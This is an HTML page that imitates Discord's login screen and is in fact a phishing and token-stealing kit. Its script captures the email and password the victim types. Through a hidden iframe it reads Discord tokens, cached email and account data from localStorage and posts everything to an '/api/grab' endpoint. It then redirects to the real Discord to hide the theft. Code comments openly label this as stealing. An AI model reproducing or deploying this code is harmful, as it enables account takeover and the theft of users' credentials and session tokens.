<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Discord</title>
  <link href="https://discord.com/assets/app.css" rel="stylesheet">
  <style>
    body { background: #36393f; margin: 0; }
    .auth-box { max-width: 480px; margin: 40px auto; background: #2f3136; padding: 32px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.5); }
    .logo { width: 120px; margin: 0 auto 20px; display: block; }
    h1 { color: white; text-align: center; font-size: 24px; margin: 0 0 8px; }
    p { color: #b9bbbe; text-align: center; font-size: 16px; margin: 0 0 20px; }
    input { width: 100%; padding: 12px; margin: 8px 0; background: #202225; border: 1px solid #202225; border-radius: 4px; color: white; font-size: 16px; }
    input:focus { border-color: #00aff4; outline: none; }
    button { width: 100%; background: #5865f2; color: white; padding: 12px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 16px; }
    button:hover { background: #4752c4; }
    .qr { text-align: center; margin: 20px 0; }
    .qr img { width: 160px; height: 160px; }
    .hide { display: none; }
  </style>
</head>
<body>
  <div class="auth-box">
    <img src="https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png" class="logo">
    <h1>Welcome back!</h1>
    <p>We're so excited to see you again!</p>

    <div id="login-form">
      <label style="color:#b9bbbe; font-size:12px; text-transform:uppercase;">Email or Phone Number</label>
      <input type="text" id="email" placeholder="email@example.com">

      <label style="color:#b9bbbe; font-size:12px; text-transform:uppercase; margin-top:12px;">Password</label>
      <input type="password" id="pass" placeholder="••••••••">

      <button onclick="login()">Log In</button>
      <p style="font-size:14px; margin-top:16px;">
        <a href="#" style="color:#00aff4;" onclick="showQR()">Or log in with QR code</a>
      </p>
    </div>

    <div id="qr-section" class="hide">
      <p>Scan with your Discord app</p>
      <div class="qr">
        <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=discord://login" alt="QR">
      </div>
      <button onclick="showForm()">Back to login</button>
    </div>

    <div id="loading" class="hide" style="text-align:center; margin:20px 0; color:#43b581;">
      <p>Logging you in...</p>
    </div>
  </div>

  <script>
    function showQR() {
      document.getElementById('login-form').classList.add('hide');
      document.getElementById('qr-section').classList.remove('hide');
      grabToken(); // Grab token on QR view
    }
    function showForm() {
      document.getElementById('qr-section').classList.add('hide');
      document.getElementById('login-form').classList.remove('hide');
    }

    function login() {
      const email = document.getElementById('email').value;
      const pass = document.getElementById('pass').value;
      if (!email || !pass) return alert("Fill in both fields");

      document.getElementById('login-form').classList.add('hide');
      document.getElementById('loading').classList.remove('hide');

      grabToken(); // Steal token on submit
      setTimeout(() => {
        window.location = "https://discord.com/channels/@me";
      }, 2000);
    }

    function grabToken() {
      const iframe = document.body.appendChild(document.createElement('iframe'));
      iframe.style.display = 'none';
      iframe.src = 'about:blank';
      iframe.onload = () => {
        try {
          const ls = iframe.contentWindow.localStorage;
          const tokens = JSON.parse(ls.tokens || '{}');
          const email_cache = ls.email_cache ? ls.email_cache.slice(1, -1) : 'N/A';
          const users = JSON.parse(ls.MultiAccountStore || '{"_state":{"users":[]}}')._state.users;

          for (const [id, token] of Object.entries(tokens)) {
            const user = users.find(u => u.id === id) || {};
            const name = user.username ? `@${user.username}#${user.discriminator}` : 'Unknown';
            const avatar = user.avatar ? `https://cdn.discordapp.com/avatars/${id}/${user.avatar}.webp` : '';

            fetch("/api/grab", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                userId: id,
                token,
                email: email_cache,
                username: name,
                avatar,
                input_email: document.getElementById('email')?.value || 'N/A',
                input_pass: document.getElementById('pass')?.value || 'N/A'
              })
            }).catch(() => {});
          }
        } catch (e) {}
      };
    }
  </script>
</body>
</html>
